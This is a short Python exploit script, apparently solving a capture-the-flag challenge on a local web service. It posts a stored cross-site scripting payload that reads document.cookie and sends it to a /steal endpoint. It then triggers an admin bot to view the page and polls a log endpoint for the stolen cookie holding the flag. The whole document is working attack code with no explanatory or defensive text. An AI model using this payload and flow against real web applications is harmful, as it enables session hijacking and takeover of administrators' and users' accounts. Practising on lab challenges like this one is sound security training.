#!/usr/bin/env python3
import requests
import time

BASE = 'http://127.0.0.1:13386'

# 1. 提交 XSS payload，利用 + 在表单中的特殊性——使用 data-urlencode
payload = '<script>fetch("/steal?c="+document.cookie)</script>'
r = requests.post(f'{BASE}/comment', data={'content': payload})
print(f'[+] comment posted: {r.status_code}')

# 2. 触发管理员 bot 访问
r = requests.get(f'{BASE}/report')
print(f'[+] report sent: {r.status_code}')

# 3. 轮询 /log 等待 flag
for i in range(20):
    r = requests.get(f'{BASE}/log')
    if r.text and r.text != '(empty)':
        print(f'[+] stolen: {r.text}')
        break
    time.sleep(1)
else:
    print('[-] no flag captured')
